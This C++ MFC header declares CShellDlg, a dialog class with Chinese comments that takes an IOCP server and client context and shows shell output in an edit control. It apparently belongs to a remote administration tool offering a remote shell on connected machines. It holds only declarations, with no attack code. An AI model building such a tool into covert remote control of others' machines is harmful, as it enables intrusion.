#pragma once

//在pch.h中包含IOCPServer.h所以这里不用包含
// CShellDlg 对话框


class CShellDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CShellDlg)

public:
	CShellDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);    // 标准构造函数
	virtual ~CShellDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SHELL };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	void OnReceiveComplete();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	CEdit m_edit;
private:
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	UINT m_nCurSel;
	UINT m_nReceiveLength;

public:
	void AddKeyBoardData();
	virtual BOOL OnInitDialog();
	afx_msg void OnEnChangeEdit();
	void ResizeEdit();
	afx_msg void OnSize(UINT nType, int cx, int cy);
};
